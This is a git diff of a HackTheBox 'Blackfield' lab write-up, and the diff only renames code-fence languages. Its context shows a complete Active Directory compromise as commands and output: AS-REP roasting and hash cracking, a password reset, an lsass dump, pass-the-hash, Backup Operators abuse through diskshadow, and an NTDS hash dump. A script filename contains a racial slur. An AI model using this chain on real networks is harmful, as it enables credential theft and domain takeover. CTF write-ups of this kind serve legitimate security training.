@@ -2,7 +2,7 @@
 
 ## NMAP ports scan
 
-```php
+```terminal
 # Nmap 7.94SVN scan initiated Thu Feb 22 12:41:07 2024 as: nmap -p- --open -sS --min-rate 5000 -n -Pn -oN ports.txt 10.10.10.192
 Nmap scan report for 10.10.10.192
 Host is up (0.15s latency).
@@ -24,7 +24,7 @@ PORT     STATE SERVICE
 
 ## NMAP base scan
 
-```php
+```terminal
 # Nmap 7.94SVN scan initiated Thu Feb 22 12:40:26 2024 as: nmap -T4 -A -Pn -oN base_scan.txt 10.10.10.192
 Nmap scan report for 10.10.10.192
 Host is up (0.15s latency).
@@ -76,19 +76,19 @@ But using the guest account, I was able to list the shares :
 
 Connected using SMBCLIENT :
 
-```php
+```terminal
 smbclient -U 'guest' \\\\10.10.10.192\\"profiles$"
 ```
 
 After listing those directory, it seems that there were all the users directories, So I used this cmd to put into this file :
 
-```php
+```terminal
 smbclient -U 'guest' \\\\10.10.10.192\\"profiles$" -c ls > raw.txt 
 ```
 
 Output
 
-```php
+```terminal
 ❯ smbclient -U 'guest' \\\\10.10.10.192\\"profiles$" -c ls                                                                                                                  
 Password for [WORKGROUP\guest]:                                                                                                                                             
   .                                   D        0  Wed Jun  3 22:17:12 2020                                                                                                  
@@ -107,13 +107,13 @@ Password for [WORKGROUP\guest]:
 
 Using regex I sorted this list and put the valid userlist.
 
-```php
+```terminal
 cat raw.txt | grep D | awk '{print $1}' > users.txt
 ```
 
 Using kerbrute found the list of valid users :
 
-```php
+```terminal
 ❯ kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 users.txt
 
     __             __               __     
@@ -140,7 +140,7 @@ $krb5asrep$18$support@BLACKFIELD.LOCAL:9bc77f492e1dd61a7731af1131cec9fe$c8d87447
 
 Using impackets [`GetNPUsers.py`](http://GetNPUsers.py) 
 
-```php
+```terminal
 ❯ GetNPUsers.py BLACKFIELD.local/support -dc-ip 10.10.10.192  
 
 Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation
@@ -155,7 +155,7 @@ b7c4180d7c67f4f481377b29122cadd903a3288e88e8
 
 Using Hashcat to crack those hashes .
 
-```php
+```terminal
 > hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt                         
 hashcat (v6.2.6) starting          
                                                                                       
@@ -200,7 +200,7 @@ Stopped: Thu Feb 22 13:08:35 2024
 
 We have our first set of valid credentials : `support:#00^BlackKnight`
 
-```php
+```terminal
 ❯ cme smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares
 SMB         10.10.10.192    445    DC01      Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         10.10.10.192    445    DC01      +] BLACKFIELD.local\support:#00^BlackKnight 
@@ -218,7 +218,7 @@ SMB         10.10.10.192    445    DC01      SYSVOL          READ            Log
 
 ## BloodHound
 
-```php
+```terminal
 ❯ bloodhound-python -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all                                                                                               
 INFO: Found AD domain: blackfield.local                                                                                                                                                       
 INFO: Getting TGT for user                                                                                                                                                                    
@@ -264,7 +264,7 @@ After analyzing through bloodhound and found that we can change the password of 
 
 To change the password of the user can use the following command :
 
-```php
+```terminal
 net rpc password "audit2020" "password@123" -U "Blackfield"/"support"%"#00^BlackKnight" -S "blackfield.local"
 ```
 
@@ -284,7 +284,7 @@ In the memory_analysis directory there was a dump files.
 
 `lsass.zip` file was interesting, so I transferred it to my device using `smbclient.py` 
 
-```php
+```terminal
 ❯ smbclient.py audit2020:'password@123'@10.10.10.192                                            
 
 Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation          
@@ -319,7 +319,7 @@ drw-rw-rw-          0  Fri May 29 01:59:24 2020 ..
 
 Then analyzed the file with `pypykatz`
 
-```php
+```terminal
 ❯ pypykatz lsa minidump lsass.DMP                                                                                                                                                             
 INFO:pypykatz:Parsing file lsass.DMP                                                                                                                                                          
 FILE: ======== lsass.DMP =======                                                                                                                                                              
@@ -368,7 +368,7 @@ I tried Administrator hash but it was not valid but svc_backup hash worked.
 
 Using `evil-winrm` to connect to the target, and fetched the flag
 
-```php
+```terminal
 evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 ```
 
@@ -380,7 +380,7 @@ SVC_BACKUP is a part of `Backup operators` Groups.
 
 Abusing the Backup Operators Groups :
 
-```php
+```terminal
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> diskshadow /s nigga.dsh                                                                    
 Microsoft DiskShadow version 1.0                                                                                                       
 Copyright (C) 2013 Microsoft Corporation                                                                                                                                                      
@@ -470,7 +470,7 @@ Then I downloaded both `ntds.dit` file and `system.hive`
 
 Using [secretsdump.py](http://secretsdump.py) to crack the hash.
 
-```php
+```terminal
 > secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
 
 Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation
@@ -595,7 +595,7 @@ SRV-INTRANET$:des-cbc-md5:4579ce9240895dae
 
 Pwned :
 
-```php
+```terminal
 ❯ cme smb 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
